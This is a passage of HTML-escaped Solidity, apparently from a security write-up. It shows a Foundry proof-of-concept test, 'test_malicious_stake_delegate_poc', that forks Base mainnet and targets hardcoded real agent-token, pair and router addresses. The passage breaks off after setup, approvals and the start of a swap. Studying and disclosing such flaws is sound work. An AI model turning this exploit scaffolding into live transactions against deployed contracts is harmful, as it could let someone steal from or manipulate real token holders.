class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint16\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewProjectBuyTaxBasisPoints_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint16\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewProjectSellTaxBasisPoints_\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIVeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003estake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edelegates\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIUniswapV2Router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapExactTokensForTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOutMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountADesired\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountBDesired\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountAMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountBMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eStakeDelegatePOC\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x1C4CcA7C5DB003824208aDDA61Bd749e55F463a3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xD418dfE7670c21F682E041F34250c114DB5D7789\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x0b3e328455c4059EEb9e3f84b5543F74E24e7E1b\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x4200000000000000000000000000000000000010\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIUniswapV2Router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIUniswapV2Router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBASE_RPC_URL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eenvString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;BASE_RPC_URL\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emakeAddr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;user\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetUp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforkId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateFork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBASE_RPC_URL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e29_225_700\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eselectFork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforkId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Set up the user with virtual tokens\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_malicious_stake_delegate_poc\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Swap half of the virtual tokens to agent tokens\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan 